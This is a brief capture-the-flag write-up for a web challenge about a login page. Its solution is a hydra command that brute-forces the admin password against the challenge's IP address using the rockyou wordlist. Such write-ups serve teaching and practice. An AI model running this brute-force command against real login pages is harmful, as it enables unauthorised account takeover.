# Mr. Green's Weird Website (web 120)
## Description
```
While investigating Mr. Green for something completely unrelated, we found this login page. Maybe you can find a way in?

http://18.219.196.70/
```
## Exploit
There was no information on what username or password Mr. Green used. This challenge was kind of guessing.

All I did was:
```bash
hydra -l admin -P rockyou.txt 18.219.196.70 http-post-form "login.php:username=^USER^&password=^PASS^:no luck"
```
